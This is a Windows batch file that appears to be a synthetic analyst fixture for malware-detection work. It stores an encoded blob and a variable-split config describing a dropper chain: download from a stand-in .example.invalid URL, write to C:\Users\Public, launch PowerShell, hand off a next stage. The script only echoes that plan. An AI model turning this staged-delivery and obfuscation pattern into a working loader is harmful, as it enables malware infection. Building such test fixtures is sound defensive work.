@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|add_7
rem HUNTRESS-MATERIAL:4o3d1gzO/o2OoBEb4oGNs5Ga7pHRs5Ga7pnZ79Hb1N4eotWN4szPqtDaAxGOqRDbuh2e6NWaoNle6xWe7VHfPNmawNXa8d1Y6lHb6x1YBpERvtHa3ZGbzBXbDuHarVzPplzO5oGQ+YzawNHa9VHc1w2c3RHa/xWN4szPqtDaAxGOqZjNBp3d7t3bENXe8NIO78ja7gGQshja0Unbwh2d0hmaEtGcmVnbwh2d0hmaDO3cs9me5xmf2dHRs5Ga85WdoNnZ79Hb1N4e8ZnZ1hWbE92dolnbDuDR7VHf2pmZs5Ga7p3gs9Hb1M3cs9me5xmf2dHR5x2e3h2aoN4e3BXeqpnZt1mdrVHavNje6xma2l3dm9ma7h2d6B3azw2cw1mZstHc553Mstnd0xWemxWewxHeqhGR6dHb7p3g4QUf
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "h0=v=1|steps=acquire_remote,write_file,dispatch_process,handoff_script|adapter=powe"
SeT "h1=rshell.exe|stage_count=4|graph=fan_out|next_language=powershell|campaign_id=camp"
SeT "h2=aign-c1e9a4c841|url=https://c1e9a4c841.example.invalid/79c242b8.dat|file_path=C:"
SeT "h3=\Users\Public\HuntressLab\stage-c1e9a4c841.dat|next_stage=stage-c1e9a4c841.ps1"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo powershell.exe acquire, write, dispatch, and hand off stage-c1e9a4c841.ps1
exit /b 0
